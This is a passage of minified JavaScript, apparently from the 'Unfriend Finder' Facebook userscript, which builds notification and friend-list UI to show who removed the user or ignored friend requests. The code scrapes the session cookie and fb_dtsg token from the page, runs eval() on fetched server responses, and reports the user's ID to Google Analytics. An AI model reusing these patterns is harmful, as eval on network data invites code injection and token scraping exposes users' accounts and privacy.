getFromId("BeeperBoxUF").style.opacity=0;_beeper.beeperBox.innerHTML=template.BeeperBox();_beeper.length=0},100)});_beeper.Show();if(getFromId("UFMessagesBeeperLink")){setTimeout(function(){EventMgr.addListener(getFromId("UFMessagesBeeperLink"),EventMgr.EVENTS.click,function(){core.filter.select("messages")})},500)}}};_beeper.Create=function beeperCreate(){trace();Console.log("Creating beeper");var parent=getFromId("fbDockChat");if(parent){var n=getFromClass("UFBeeper_Active").length;if(n==0){_beeper.Build()
}else{if(n==1){_beeper.beeperBox=getFromClass("UFBeeper_Active")[0];_beeper.Add()}}}};_beeper.Show=function beeperShow(){trace();_beeper.fadeIn();if(_beeper.fadeTimeout){clearTimeout(_beeper.fadeTimeout)}_beeper.fadeTimeout=setTimeout(_beeper.fadeOut,Params.Beeper.timer*1000)};_beeper.getBeeperChildren=function beeperGetChildren(el){trace();var beepers=(new xPathSelector("//*[@class='Beeps']/div")).getMultipleNodeValues(),boxes=new (Array),child;while(child=beepers.iterateNext()){boxes.push(child)
}return boxes};_beeper.beeperMouseEvents=function beeperMouseEvents(){trace();var children=_beeper.getBeeperChildren(_beeper.beepsBox),n=children.length,child,i;for(i=0;i<n;i++){child=children[i];_beeper.beepAddMouseEvent(child);CSS3.setClass(child,"UFBeep");if(i==0){CSS3.addClass(child,"UFBeep_Top")}if(i==(n-1)){CSS3.addClass(child,"UFBeep_Bottom")}}};_beeper.beepAddMouseEvent=function beepAddMouseEvent(child){trace();var parent;if(parent=child.parentNode.parentNode){EventMgr.addListener(child,EventMgr.EVENTS.mouseover,function(){CSS3.addClass(child,"UFBeep_Selected");
if(/UFBeep_Bottom/.test(child.className)){CSS3.setClass(getFromId("UFBeeper_Arrow"),"UFBeeper_Arrow_Selected")}});EventMgr.addListener(child,EventMgr.EVENTS.mouseout,function(){CSS3.removeClass(child,"UFBeep_Selected");if(/UFBeep_Bottom/.test(child.className)){CSS3.setClass(getFromId("UFBeeper_Arrow"),"UFBeeper_Arrow")}})}};_beeper.toString=function toString(){return"[object Beeper]"};_beeper.Build()};var Notification=function Notification(__constructor){var _notification=this;Extend(_notification,__constructor);
if((!_notification.id)||(!_notification.text)||(!_notification.type)){return}_notification.colors=[237,239,245];_notification.divNotif;_notification.injected=false;_notification.whiteIn=function notificationWhiteIn(){trace();var notifs=toArray(getFromId("ufNotificationsList").getElementsByClassName("notification"));if((_notification.colors[0]>=255)&&(_notification.colors[1]>=255)&&(_notification.colors[2]>=255)){_notification.colors[0]=255;_notification.colors[1]=255;_notification.colors[2]=255;notifs.forEach(function(notif){if(notif.style){notif.style.background="rgb(255, 255, 255)"
}});return}notifs.forEach(function(notif){if(notif.style){notif.style.background="rgb("+_notification.colors[0]+", "+_notification.colors[1]+", "+_notification.colors[2]+")"}});if(_notification.colors[0]<255){_notification.colors[0]+=1}if(_notification.colors[1]<255){_notification.colors[1]+=1}if(_notification.colors[2]<255){_notification.colors[2]+=1}setTimeout(function def(){Console.log("setTimeout _notification.whiteIn");_notification.whiteIn()},200)};_notification.AddBlock=function notificationAddBlock(){trace();
try{if(!getFromId("fbNotificationsList")){return}var content=getFromId("fbNotificationsList").firstElementChild,divFix;if(getFromId("jewelNoNotifications")){getFromId("fbNotificationsList").removeChild(getFromId("jewelNoNotifications"))}if(getFromId("ufNotificationsList")){divFix=getFromId("ufNotificationsList")}else{if(getFromId("fbNotificationsFlyout")){divFix=new xHTMLElement({element:"ul",id:"ufNotificationsList",style:{padding:"0px",paddingTop:"2px"},className:"jewelItemList",parentNode:getFromId("fbNotificationsList").parentNode,before:getFromId("fbNotificationsList")}).getElement();
CSS3.addClass(getFromId("fbNotificationsFlyout"),"jewelFix")}if(getFromId("fbNotificationsList")){getFromId("fbNotificationsList").style.paddingTop="0px"}}try{var notificationTime=(_notification.type=="unfriend"?genTime(core.unfriends.Items[_notification.id]?core.unfriends.Items[_notification.id].time:core.time()):genTime(core.awaitingsIgnored.Items[_notification.id]?core.awaitingsIgnored.Items[_notification.id].time:core.time()));_notification.divNotif=new xHTMLElement({element:"li",id:"notification_uf_"+_notification.id,className:"notification",style:{background:"rgb(239, 241, 247)"},innerHTML:parseTemplate('<a class="notifMainLink" onclick="if ($(\''+Params.filterName+"')) { window.reinject(function() { core.filter.select('"+(_notification.type=="ignored"?"awaitings":"unfriends")+'\'); }); if (/openToggler/.test($(\'fbNotificationsJewel\').className)) Toggler.toggle($(\'fbNotificationsJewel\')); return false; }" href="::link::">    <div class="clearfix uiImageBlock notif_block">        <img class="uiProfilePhoto uiImageBlockImage uiImageBlockSmallImage lfloat uiProfilePhotoLarge img" src="::picture::" alt="">        <div class="uiImageBlockContent uiImageBlockSmallContent">            <div id="notification_::id::_info" class="info status_::status::">                <span class="blueName">::bluename::</span> ::text::                <div class="UIImageBlock clearfix metadata">                    <i class="UIImageBlock_Image UIImageBlock_ICON_Image ::icon::"></i>                    <span class="timestamp UIImageBlock_Content UIImageBlock_ICON_Content fss fwn fcg">                        <abbr id="notification_uf_status_::id::" class="timestamp"><span class="en_US">Detected on: </span><span class="fr_FR">Détécté le: </span>::subtext::</abbr>                    </span>                </div>            </div>        </div>    </div></a>',{params:{id:_notification.id,status:_notification.status,link:(_notification.fish?Params.protocol+"//"+Params.host+"/?sk=unfriends":Params.protocol+"//"+Params.host+"/profile.php?id="+_notification.id),picture:Params.protocol+"//graph.facebook.com/"+_notification.id+"/picture",bluename:_notification.text,text:(_notification.type=="unfriend"?(_notification.status=="deactivated"?LANG.text_deactivated:LANG.text_unfriend):LANG.text_ignored),subtext:notificationTime,icon:(_notification.type=="unfriend"?"spritemap_app_icons img sx_app_icons_unfriends":"spritemap_app_icons img sx_app_icons_awaitings")}}),parentNode:divFix,listeners:{mouseover:function(){CSS3.setClass(_notification.divNotif,"notification notifHover")
},mouseout:function(){CSS3.setClass(_notification.divNotif,"notification")},click:function(){if(getFromId(Params.filterName)){core.filter.select("unfriends")}else{core.href(Params.protocol+"//"+Params.host+"/?sk=unfriends")}}}}).getElement()}catch(exception){new ErrorHandler(exception,"_notification.AddBlock()")}try{if(!/openToggler/.test(getFromId("fbNotificationsFlyout").parentNode.className)){if(getFromId("fbNotificationsJewel")){EventMgr.addListener(getFromId("fbNotificationsJewel"),EventMgr.EVENTS.click,function(){_notification.colors=[239,241,247];
Console.log("setTimeout _notification.whiteIn");setTimeout(_notification.whiteIn,4000)})}}else{_notification.colors=[239,241,247];Console.log("setTimeout _notification.whiteIn");setTimeout(_notification.whiteIn,4000)}}catch(ex){}}catch(exception){new ErrorHandler(exception,"_notification.AddBlock()")}};_notification.mouseover=function notificationMouseOver(element){trace();EventMgr.addListener(element,EventMgr.EVENTS.mouseover,function(){CSS3.addClass(element,"selected")});EventMgr.addListener(element,EventMgr.EVENTS.mousemove,function(){CSS3.addClass(element,"selected")
})};_notification.mouseout=function notificationMouseOut(element){trace();EventMgr.addListener(element,EventMgr.EVENTS.mouseout,function(){CSS3.removeClass(element,"selected")})};_notification.Add=function notificationAdd(){trace();if(!/openToggler/.test(getFromId("fbNotificationsFlyout").parentNode.className)){core.injectNotification()}};_notification.toString=function toString(){return"[object Notification]"};if(getFromId("fbNotificationsJewel")){if(_notification.injected){return}EventMgr.addListener(getFromId("fbNotificationsJewel"),EventMgr.EVENTS.click,function(){try{if(core.Beeper.length>0){if(core.Beeper.fadeTimeout){clearTimeout(core.Beeper.fadeTimeout)
}Console.log("setTimeout core.Beeper.fadeOut");core.Beeper.fadeTimeout=setTimeout(core.Beeper.fadeOut,10)}}catch(exception){new ErrorHandler(exception,"beeper.fadeOut()")}inject(function(){presenceNotifications.alertList.unreadCount=0;Arbiter.inform("jewel/count-updated",{jewel:"notifications",count:presenceNotifications.alertList.unreadCount},Arbiter.BEHAVIOR_STATE)});core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));for(n in core.toNotify.Items){if(core.toNotify.Items.hasOwnProperty(n)){core.toNotify.Items[n]="no"
}}Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString());core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));for(n in core.awaitingsIgnored.Items){if(core.awaitingsIgnored.Items.hasOwnProperty(n)){core.awaitingsIgnored.Items[n].toNotify="no"}}Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString())});_notification.injected=true}_notification.Add();_notification.AddBlock()};var UserItem=function UserItem(__constructor){trace();
var _useritem=this;Extend(_useritem,__constructor);_useritem.element;_useritem.name=evalName(_useritem.name);_useritem.Build=function UserItemBuild(){if(getFromId("homeUnfriends")){var textHide,textTitle;if(_useritem.from=="awaiting"){textHide=LANG.text_removec}else{textHide=LANG.text_hide}if(_useritem.from=="unfriend"){textHide=textHide}if(_useritem.from=="unfriend"){textTitle="This is the date on which Unfriend Finder has detected that "+_useritem.name+" was no longer in your friendlist. ("+(new Date(_useritem.time*1000)).toLocaleString()+") This is not necessarily the date on which "+_useritem.name+" precisely removed you or deactivated his/her profile."
}else{if(_useritem.from=="rawaiting-a"){textTitle="This is the date on which Unfriend Finder has detected that "+_useritem.name+" accepted your friend request. ("+(new Date(_useritem.time*1000)).toLocaleString()+") This is not necessarily the date on which "+_useritem.name+" precisely accepted the request."}else{if(_useritem.from=="rawaiting-i"){textTitle="This is the date on which Unfriend Finder has detected that "+_useritem.name+" ignored your friend request. ("+(new Date(_useritem.time*1000)).toLocaleString()+") This is not necessarily the date on which "+_useritem.name+" precisely ignored the request."
}else{if(_useritem.from=="rawaiting"){textTitle="This is the date on which Unfriend Finder has detected that "+_useritem.name+" accepted or ignored your friend request. ("+(new Date(_useritem.time*1000)).toLocaleString()+") This is not necessarily the date on which "+_useritem.name+" precisely accepted or ignored the request."}else{if(_useritem.from=="reappeared"){textTitle="This is the date on which Unfriend Finder has detected that "+_useritem.name+" reappeared in your friendlist. ("+(new Date(_useritem.time*1000)).toLocaleString()+")"
}else{textTitle=""}}}}}if(_useritem.isNew){_useritem.element={id:"n"+_useritem.id};setTimeout(function(){_useritem.element.id=_useritem.id},1500)}else{_useritem.element={id:_useritem.id}}if(getFromId(_useritem.element.id)){return}_useritem.time=genTime(_useritem.time);_useritem.element=new xHTMLElement({element:"li",id:(_useritem.isNew?"n":"")+_useritem.id,className:"objectListItem ufListItem",parentNode:Switch(_useritem.from,{rawaiting:getFromId("acceptedignoredContentUL"),"rawaiting-a":getFromId("acceptedContentUL"),"rawaiting-i":getFromId("ignoredContentUL"),awaiting:getFromId("pendingContentUL"),reappeared:getFromId("reappearedContentUL")})}).getElement();
if((_useritem.from=="awaiting")&&(Params.settings.newManagementLists)){var buttons='    <div class="FriendButton profileHeaderButton">        <label class="FriendRequestAdd hidden_elem uiButton">            <i class="mrs img sp_bnqbay sx_e8aeae"></i>            <input value="Add Friend" type="button">        </label>        <a class="FriendRequestOutgoing enableFriendListFlyout uiButton" role="button" href="#" data-profileid="::id::" data-flloc="fbx_top_bar" style="height: 17px; min-width:153px;">            <span class="uiButtonText"><i class="iconNewManager"></i>::pending::</span>        </a>    </div>'
}else{var buttons='    <div class="ButtonContainer">        <span class="loadingIndicator" style="display: block; visibility: visible;"></span>        <label class="uiButton uiButtonConfirm unfriendHide"><input type="button" value="::hide::" name="::id::" id="a_removeLink::id::"></label>        <label class="uiButton uiButtonSpecial unfriendAlwaysHide" style="display:none;"><input type="button" value="::alwayshide::" name="::id::" id="a_AremoveLink::id::"></label>        <label class="uiButton uiButtonDefault unfriendBlock" style="display:none;"><input type="button" value="::block::" name="::id::" id="a_BremoveLink::id::"></label>    </div>'
}buttons=parseTemplate(buttons,{params:Extend({pending:LANG.text_pending,hide:textHide,alwayshide:LANG.text_alwayshide,block:LANG.block},_useritem)});if(core.overflow()){buttons=""}if(_useritem.time&&Params.settings.showTime){var content='    <div class="UIImageBlock_Content UIImageBlock_ENT_Content">        <div style="font-weight: bold; font-size:13px; cursor: default;">            <a data-hovercard="/ajax/hovercard/hovercard.php?id=::id::" data-hovercardx="/ajax/hovercard/hovercard.php?id=::id::" href="::protocol:://www.facebook.com/profile.php?id=::id::" id="a_username__::id::">::name::</a>&nbsp;<span style="font-weight:normal; cursor:default;" id="span_data_subtext__::id::">::subname::</span>        </div>        <div class="uiTextSubtitle">            <div class="requestLabel" style="padding-top: 5px; cursor:default;">                <span id="span_icon__::id::" style="width:21px;"><img src="::indicator::" style="margin-left:5px; margin-bottom:-1px;" /></span>                <span style="font-size: 11px; line-height: 17px; cursor: help; color: gray;" class="uiStreamSource" title="::title::">                    <span id="text_detected"><span class="en_US">Detected on: </span><span class="fr_FR">Détécté le: </span></span>::time::                </span>            </div>        </div>    </div>'
}else{var content='    <div class="UIImageBlock_Content UIImageBlock_ENT_Content">        <div style="font-weight: bold; font-size:13px; cursor: default;">           <a data-hovercard="/ajax/hovercard/hovercard.php?id=::id::" data-hovercardx="/ajax/hovercard/hovercard.php?id=::id::" href="::protocol:://www.facebook.com/profile.php?id=::id::" id="a_username__::id::">::name::</a>        </div>        <div class="uiTextSubtitle">            <div class="requestLabel" style="padding-top: 5px; cursor:default;">                <span id="span_icon__::id::" style="width:21px;"><img src="::indicator::" style="margin-left:5px; margin-bottom:-1px;" /></span>                <span style="line-height:15px; cursor:default;" class="uiStreamSource" id="span_data_subtext__::id::" style="color: gray;">::subname::</span>            </div>        </div>    </div>'
}content=parseTemplate(content,{params:Extend({blank:Params.images.blank,picture:(/_q\.jpg/.test(_useritem.picture)?_useritem.picture.replace(/_q\.jpg/,"_s.jpg"):"https://graph.facebook.com/"+_useritem.id+"/picture?type=normal"),nopicture:Params.images.noPicture,opacity:(_useritem.status=="deactivated"?"opacity:0.5":""),title:textTitle,pending:LANG.text_pending,hide:textHide,alwayshide:LANG.text_alwayshide,block:LANG.block,indicator:Params.images.smallIndicator,protocol:Params.protocol,},_useritem)});
_useritem.elementInline=new xHTMLElement({element:"div",id:(_useritem.isNew?"n":"")+_useritem.id,className:"itemInline",style:{height:"50px",background:(_useritem.highlighted?"#FFF9D7":"")},innerHTML:parseTemplate('    <div class="UIImageBlock clearfix UIImageBlock_Entity from::from::">       <a data-hovercard="/ajax/hovercard/hovercard.php?id=::id::" data-hovercardx="/ajax/hovercard/hovercard.php?id=::id::" href="::protocol:://www.facebook.com/profile.php?id=::id::" class="UIImageBlock_Image UIImageBlock_SMALL_Image" style="background: url(\'::nopicture::\');">           <img id="img_userpic__::id::" src="::blank::" class="objectListImg_fix img" style="background:url(\'::picture::\');">       </a>       <div class="auxiliary UIImageBlock_Ext" id="div_rightContent_::id::">          ::buttons::       </div>       ::content::    </div>',{params:Extend({blank:Params.images.blank,picture:(/_q\.jpg/.test(_useritem.picture)?_useritem.picture.replace(/_q\.jpg/,"_s.jpg"):"https://graph.facebook.com/"+_useritem.id+"/picture?type=normal"),nopicture:Params.images.noPicture,opacity:(_useritem.status=="deactivated"?"opacity:0.5":""),title:textTitle,time:genTime(_useritem.time),pending:LANG.text_pending,hide:textHide,alwayshide:LANG.text_alwayshide,block:LANG.block,indicator:Params.images.smallIndicator,protocol:Params.protocol,buttons:buttons,content:content},_useritem)}),parentNode:_useritem.element}).getElement();
_useritem.elementBlock=new xHTMLElement({element:"div",id:"itemBlock_"+_useritem.id,className:"itemBlock",style:{background:(_useritem.highlighted?"#FFF9D7":"")},innerHTML:parseTemplate('    <div id="itemBlock_unit_::id::" class="from::from:: page_browser_unit page_browser_unit_unliked page_browser_unit_mouseout" style="::opacity::">        <div class="page_browser_pic_container">            <a href="#">                <img id="itemBlock_userpic__::id::" style="background-image: url(\'::photo::\');" alt="" src="::blank::" class="page_browser_profile_pic img">            </a>            <div class="page_browser_hover_background"></div>            <div class="ButtonContainer page_browser_button_container">                <label for="ab_removeLink::id::" class="unfriendHide uiButton uiButtonLarge">                    <input type="submit" id="ab_removeLink::id::" value="::hide::">                </label>                <label for="ab_AremoveLink::id::" class="unfriendAlwaysHide uiButton uiButtonLarge" style="display: none;">                    <input type="submit" id="ab_AremoveLink::id::" value="::alwayshide::">                </label>                <label for="ab_BremoveLink::id::" class="unfriendBlock uiButton uiButtonLarge" style="display: none;">                    <input type="submit" id="ab_BremoveLink::id::" value="::block::">                </label>            </div>            <img width="32" height="32" alt="" src="::indicator::" class="page_browser_indicator img">        </div>        <div class="pas page_browser_page_name_box">            <a data-hovercard="/ajax/hovercard/hovercard.php?id=::id::" data-hovercardx="/ajax/hovercard/hovercard.php?id=::id::" href="::protocol:://www.facebook.com/profile.php?id=::id::" class="page_browser_page_name">::name::</a>        </div>    </div>',{params:Extend({blank:Params.links.rsrc+"/v1/y4/r/-PAXP-deijE.gif",photo:(/_q\.jpg/.test(_useritem.picture)?_useritem.picture.replace(/_q\.jpg/,"_s.jpg"):"https://graph.facebook.com/"+_useritem.id+"/picture?type=normal"),opacity:(_useritem.status=="deactivated"?"opacity:0.5":""),hide:textHide,alwayshide:LANG.text_alwayshide,block:LANG.block,indicator:Params.images.bigIndicator,protocol:Params.protocol},_useritem)}),parentNode:_useritem.element}).getElement();
if(_useritem.isNew){setTimeout(function(){_useritem.element.id=_useritem.id},1500)}if(_useritem.highlighted){core.listHighlighted.push(_useritem.elementInline)}if(_useritem.from=="unfriend"){if(getFromId("unfriendsContentUL").firstElementChild){getFromId("unfriendsContentUL").insertBefore(_useritem.element,getFromId("unfriendsContentUL").firstElementChild)}else{getFromId("unfriendsContentUL").appendChild(_useritem.element)}}EventMgr.addListener(getFromId("itemBlock_unit_"+_useritem.id),EventMgr.EVENTS.mouseover,function(){CSS3.removeClass(getFromId("itemBlock_unit_"+_useritem.id),"page_browser_unit_mouseout");
CSS3.addClass(getFromId("itemBlock_unit_"+_useritem.id),"page_browser_unit_mouseover")});EventMgr.addListener(getFromId("itemBlock_unit_"+_useritem.id),EventMgr.EVENTS.mouseout,function(){CSS3.addClass(getFromId("itemBlock_unit_"+_useritem.id),"page_browser_unit_mouseout");CSS3.removeClass(getFromId("itemBlock_unit_"+_useritem.id),"page_browser_unit_mouseover")});if(!Params.settings.icons){CSS3.hide(getFromId("span_icon__"+_useritem.id))}var a_removeLink=getFromId("a_removeLink"+_useritem.id),a_AremoveLink=getFromId("a_AremoveLink"+_useritem.id),a_BremoveLink=getFromId("a_BremoveLink"+_useritem.id),div_rightContent=getFromId("div_rightContent_"+_useritem.id);
var ab_removeLink=getFromId("ab_removeLink"+_useritem.id),ab_AremoveLink=getFromId("ab_AremoveLink"+_useritem.id),ab_BremoveLink=getFromId("ab_BremoveLink"+_useritem.id);if(_useritem.from=="rawaiting"){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.clickToRemoveA(_useritem.id)})}else{if(_useritem.from=="rawaiting-a"){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.clickToRemoveA(_useritem.id)})}else{if(_useritem.from=="rawaiting-i"){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.clickToRemoveA(_useritem.id)
})}else{if(_useritem.from=="awaiting"){if(!core.uf_fb_dtsg){CSS3.hide(div_rightContent)}if(!Params.settings.newManagementLists){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.removeConnectionWith({uid:_useritem.id})})}}else{if(_useritem.from=="reappeared"){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.removeFromReappeared(_useritem.id)})}else{if(_useritem.from=="unfriend"){EventMgr.addListener(a_removeLink,EventMgr.EVENTS.click,function(){core.clickToRemove(_useritem.id)
});EventMgr.addListener(a_AremoveLink,EventMgr.EVENTS.click,function(){core.clickToRemove(_useritem.id)});EventMgr.addListener(a_BremoveLink,EventMgr.EVENTS.click,function(){core.blockProfile(_useritem.id)});EventMgr.addListener(ab_removeLink,EventMgr.EVENTS.click,function(){core.clickToRemove(_useritem.id)});EventMgr.addListener(ab_AremoveLink,EventMgr.EVENTS.click,function(){core.clickToRemove(_useritem.id)});EventMgr.addListener(ab_BremoveLink,EventMgr.EVENTS.click,function(){core.blockProfile(_useritem.id)
})}}}}}}if((_useritem.hidden)||(_useritem.status=="deactivated")){getFromId("img_userpic__"+_useritem.id).parentNode.style.opacity=0.4;getFromId("itemBlock_unit_"+_useritem.id).style.opacity=0.4;getFromId("a_username__"+_useritem.id).style.color="inherit";getFromId("a_username__"+_useritem.id).style.cursor="default";getFromId("a_username__"+_useritem.id).style.textDecoration="none";getFromId("a_username__"+_useritem.id).href="javascript:void(0)";getFromId("img_userpic__"+_useritem.id).parentNode.style.cursor="default";
getFromId("img_userpic__"+_useritem.id).parentNode.href="javascript:void(0)"}}};_useritem.Build();_useritem.toString=function toString(){return"[object UserItem]"};return _useritem};var UserCheck=function UserCheck(__constructor){trace();var usercheck=this;Extend(usercheck,__constructor);usercheck.profileUrl=Params.protocol+"//"+Params.host+"/profile.php?id="+usercheck.uid;usercheck.user=core.unfriends.Items[usercheck.uid];if(usercheck.status=="unfriend"){core.setSubName({uid:usercheck.uid,text:LANG.text_unfriend,type:"unfriend"})
}else{if(usercheck.status=="deactivated"){core.setSubName({uid:usercheck.uid,text:LANG.text_deactivated,type:"hidden"})}}if(usercheck.user){if((core.time()-usercheck.user.lastcheck)<(60*60*24*3)){CSS3.removeClass(getFromId(usercheck.uid),"loadingProfile");if(document.getElementsByClassName("loadingProfile").length==0){core.filter.loadingIndicator("unfriends",false)}else{core.filter.loadingIndicator("unfriends",true)}return}}if(usercheck.forced=="unfriend"){CSS3.removeClass(getFromId(usercheck.uid),"loadingProfile");
core.setSubName({uid:usercheck.uid,text:LANG.text_unfriend,type:"unfriend"});return}usercheck.distinct=function(){var myJson,redirect;if(/<body [^>]+>/.test(usercheck.pageContent)){if(/window\._script_path = "..profile(_book)?\.php/.test(usercheck.pageContent)){usercheck.profile()}else{usercheck.notFound()}}else{if(/window.location.replace\("([^"]*)"\)/.test(usercheck.pageContent)){redirect=usercheck.pageContent.match(/window.location.replace\("([^"]*)"\)/);if(redirect[1]){usercheck.profileUrl=redirect[1].replace(/\\\//g,"/");
usercheck.Load()}}else{if(/for \(;;\);\{/.test(usercheck.pageContent)){if(myJson=eval("("+usercheck.pageContent.replace("for (;;);","")+")")){if(redirect=myJson.payload.redirect){usercheck.profileUrl=redirect.replace(/\\\//g,"/");usercheck.Load()}}}}}};usercheck.profile=function(){var matches2;CSS3.removeClass(getFromId(usercheck.uid),"loadingProfile");core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));if(/profile_action_remove_friend/.test(usercheck.pageContent)){if(core.unfriends.Items[usercheck.uid]){delete core.unfriends.Items[usercheck.uid]
}if(getFromId(usercheck.uid)){core.slideRemove(getFromId(usercheck.uid))}}else{core.setSubName({uid:usercheck.uid,text:LANG.text_unfriend,type:"unfriend"});matches2=usercheck.pageContent.match(/<title>(.+)<\/title>/);if(core.unfriends.Items[usercheck.uid]){core.unfriends.Items[usercheck.uid].status="unfriend"}try{core.setName(usercheck.uid,matches2[1],true);core.unfriends.Items[usercheck.uid].lastcheck=core.time();core.setPicture(usercheck.uid);if(document.getElementsByClassName("loadingProfile").length==0){core.filter.loadingIndicator("unfriends",false)
}else{core.filter.loadingIndicator("unfriends",true)}}catch(exception){new ErrorHandler(exception,"usercheck.profile()")}}Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString())};usercheck.notFound=function(){CSS3.removeClass(getFromId(usercheck.uid),"loadingProfile");if(usercheck.user){core.setName(usercheck.uid,usercheck.user.name,false)}core.setPicture(usercheck.uid);core.setSubName({uid:usercheck.uid,text:LANG.text_deactivated,type:"hidden"});if(getFromId("img_userpic__"+usercheck.uid)){getFromId("img_userpic__"+usercheck.uid).parentNode.style.opacity="0.4"
}if(getFromId("itemBlock_unit_"+usercheck.uid)){getFromId("itemBlock_unit_"+usercheck.uid).style.opacity="0.4"}if(document.getElementsByClassName("loadingProfile").length==0){core.filter.loadingIndicator("unfriends",false)}else{core.filter.loadingIndicator("unfriends",true)}core.deactivated=new CollectionList(eval(Registry.getKey(core.user_id+"_deactivated","({})")));if(usercheck.user){core.deactivated.Add(usercheck.uid,usercheck.user)}Registry.setKey(core.user_id+"_deactivated",core.deactivated.toString());
core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));if(core.unfriends.Items[usercheck.uid]){core.unfriends.Items[usercheck.uid].status="deactivated";core.unfriends.Items[usercheck.uid].lastcheck=core.time()}Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString())};usercheck.Load=function(){CSS3.addClass(getFromId(usercheck.uid),"loadingProfile");if(usercheck.profileUrl){Ajax({method:"get",headers:Params.Ajax.Headers,url:usercheck.profileUrl,onload:function(data){usercheck.pageContent=data;
usercheck.distinct()},onerror:function(data){usercheck.notFound()}})}};usercheck.toString=function toString(){return"[object UserCheck]"};usercheck.Load()};var FriendListComparer=function FriendListComparer(){var friendlist=this;if(!core){return}friendlist.url=Params.protocol+"//"+Params.host+"/ajax/typeahead/first_degree.php?viewer="+core.user_id+"&token=1-1&filter[0]=user";friendlist.displayError=function(code){friendlist.lock=true;setTimeout(function(){Console.error("Error",'<b>Error while retreiving Facebook database</b> (<a onclick="window.open(this.href); return false;" href="'+friendlist.url+'">first_degree.php</a>) <br />Error code: 0x000'+code+", Check your connection.")
},8000)};friendlist.callback=core.parseTypeahead;friendlist.lastcheck=0;friendlist.lock=false;friendlist.load=function FriendListComparerLoad(g){trace();friendlist.error=null;if(friendlist.lock){return}friendlist.lock=true;var myJsonFriendsOnly,myJsonPendingRequests,first_degree={method:"get",headers:Params.Ajax.Headers,url:friendlist.url+"&options[0]=friends_only",onload:function(data){if(myJsonFriendsOnly=eval("("+data.replace("for (;;);","")+")")){if(myJsonFriendsOnly.errorDescription){Console.error(myJsonFriendsOnly.errorSummary,"<b>Error while retreiving Facebook database</b><br />"+myJsonFriendsOnly.errorDescription);
friendlist.error=myJsonFriendsOnly.errorDescription;if(getFromId("UFNubToggler")){CSS3.display(getFromId("UFNubToggler").parentNode,CSS3.DISPLAY.inlineBlock);getFromId("iconNubUF").style.opacity="0.4";getFromId("iconNubUFerror").style.opacity="1";var iconNubUFerrorVisible=true;CSS3.display(getFromId("iconNubUFerror"),CSS3.DISPLAY.block);setInterval(function(){iconNubUFerrorVisible=!iconNubUFerrorVisible;if(iconNubUFerrorVisible){CSS3.display(getFromId("iconNubUFerror"),CSS3.DISPLAY.block)}else{CSS3.hide(getFromId("iconNubUFerror"))
}},1000)}}else{if(myJsonFriendsOnly.payload.entries.length>0){core.payloadFriendsOnly=myJsonFriendsOnly.payload.entries;Ajax({method:"get",headers:Params.Ajax.Headers,url:friendlist.url+"&options[0]=pending_request",onload:function(data){friendlist.lock=false;friendlist.lastcheck=core.time();if(myJsonPendingRequests=eval("("+data.replace("for (;;);","")+")")){if(myJsonPendingRequests.errorDescription){Console.error(myJsonPendingRequests.errorSummary,"<b>Error while retreiving Facebook database</b><br />"+myJsonPendingRequests.errorDescription)
}else{if(myJsonPendingRequests.payload.entries.length>0){core.payloadPendingRequests=myJsonPendingRequests.payload.entries;Console.log("Applying callback");friendlist.callback()}}}else{friendlist.displayError(1)}},onerror:function(){friendlist.displayError(4)}})}}}else{friendlist.displayError(3)}},onerror:function(){friendlist.displayError(4)}};if((core.time()-friendlist.lastcheck)<15){Console.log("Typeahead cached, Unlocking and applying callback");friendlist.lock=false;setTimeout(function(){friendlist.callback()
},600)}else{if(!!!g){Console.log("Loading typeaheads");Ajax(first_degree)}}};return{load:friendlist.load,getError:function(){return friendlist.error}}};var GoogleAnalytics=function GoogleAnalytics(__constructor){if(!Params.settings.statistics){return}trace();new xHTMLElement({element:"script",id:"GoogleAnalytic_"+__constructor.account,innerHTML:parseTemplate("    var _gaq = _gaq || [];    _gaq.push(['_setAccount', '::account::']);    _gaq.push(['_setCustomVar', 1, 'uid', '::id::']);    _gaq.push(['_setCustomVar', 2, 'scriptLanguage', '::lang::']);    _gaq.push(['_setCustomVar', 3, 'hideNub', '::setting1::']);    _gaq.push(['_setCustomVar', 4, 'version', '36']);    _gaq.push(['_trackPageview']);        (function() {        var ga = document.createElement('script');        ga.type = 'text/javascript';        ga.async = true;        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';        var s = document.getElementsByTagName('script')[0];        s.parentNode.insertBefore(ga, s);    })();",{params:Extend({id:core.user_id,lang:LANG,setting1:Params.settings.hideNub,version:Params.version},__constructor)}),parentNode:Params.body})
};var UserID=function UserID(){trace();this.fromCookie=function(){try{var uid,fragments=document.cookie.split("; "),item;fragments.forEach(function(fragment){item=fragment.split("=");if(item[0]=="c_user"){uid=item[1]}});return uid||0}catch(exception){}return null};this.parseEnv=function(){if(Params.env.isIE){return window.Env}if(Params.Global){return Params.Global}var scripts=(new xPathSelector("//script")).getMultipleNodeValues(),innerEnv=null;while(script=scripts.iterateNext()){if(/"?fb_dtsg"?:/.test(script.innerHTML)){innerEnv=script.innerHTML
}}if(innerEnv){try{var Env={user:innerEnv.match(/"?user"?:"(\d+)",/)[1],fb_dtsg:innerEnv.match(/"?fb_dtsg"?:"(\w+)",/)[1],post_form_id:innerEnv.match(/"?post_form_id"?:"(\w+)",/)[1]}}catch(exception){var Env={}}return innerEnv}else{return false}};this.fromEnvString=function(){if(!this.env){return 0}return this.env.match(/"?user"?:"(\d+)",/)[1]||-1};this.fromEvalEnv=function(){if(!this.env){return 0}try{eval(this.env);return Env.user||-1}catch(exception){}return 0};this.env=this.parseEnv();this.getId=function(){var userid;
